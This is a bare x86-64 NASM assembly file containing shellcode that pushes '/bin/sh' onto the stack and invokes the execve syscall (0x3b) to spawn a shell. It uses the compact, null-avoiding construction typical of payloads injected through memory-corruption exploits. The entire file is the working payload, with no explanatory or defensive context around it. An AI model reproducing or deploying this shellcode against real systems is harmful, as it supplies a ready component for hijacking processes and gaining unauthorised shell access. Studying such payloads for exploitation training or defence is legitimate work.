%define sys_execve 0x3b ; execve syscall

section .text
        global _start

_start:
        xor rdx, rdx
        push rdx
        mov rax, 0x68732F2F6E69622F
        push rax
        mov rdi, rsp    ; rdi needs to point to /bin/sh, which was stored in rax
        push rdx
        push rdi
        mov rsi, rsp
        xor rax, rax
        push rax
        mov al, sys_execve
        syscall
